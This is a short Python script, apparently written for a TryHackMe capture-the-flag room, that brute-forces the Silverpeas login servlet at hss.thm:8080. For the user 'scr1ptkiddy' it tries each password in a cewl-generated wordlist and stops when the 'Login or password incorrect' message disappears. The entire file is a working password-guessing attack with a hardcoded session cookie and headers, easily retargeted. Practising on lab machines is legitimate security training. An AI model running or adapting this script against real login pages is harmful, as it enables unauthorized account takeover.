# hint: wordlist can be generated using the cewl tool
import requests

# The URL to send the POST request to
url = "http://hss.thm:8080/silverpeas/AuthenticationServlet"

# Define headers
headers = {
    "Host": "hss.thm:8080",
    "Content-Length": "44",
    "Cache-Control": "max-age=0",
    "Accept-Language": "en-US,en;q=0.9",
    "Origin": "http://hss.thm:8080",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://hss.thm:8080/silverpeas/defaultLogin.jsp?DomainId=0&ErrorCode=1",
    "Accept-Encoding": "gzip, deflate, br",
    "Cookie": "JSESSIONID=xC5Aj1lt86ukNvIE51TF130RPCcjmU7sK5WMNUaz.ebabc79c6d2a",
    "Connection": "keep-alive"
}

# Wordlist file path
wordlist_path = "wordlist.txt" # Change to ur wordlist dir

# Open the wordlist and iterate through the words
with open(wordlist_path, "r") as wordlist_file:
    for word in wordlist_file:
        word = word.strip()  # Remove any surrounding whitespace
        
        # Construct the POST data
        data = {
            "Login": "scr1ptkiddy",
            "Password": word,  # Password from file goes here
            "DomainId": "0"
        }

        # Send the POST request
        response = requests.post(url, headers=headers, data=data)

        # Check if "Login or password incorrect" is in the response body
        if "Login or password incorrect" in response.text:
	        print(f"Attempted Password: {word}")
	        print("Login or password incorrect")
	        print() # Spacing after each attempt
        else:
	        print(f"Password found: {word}")
	        break

print("Finished sending requests.")
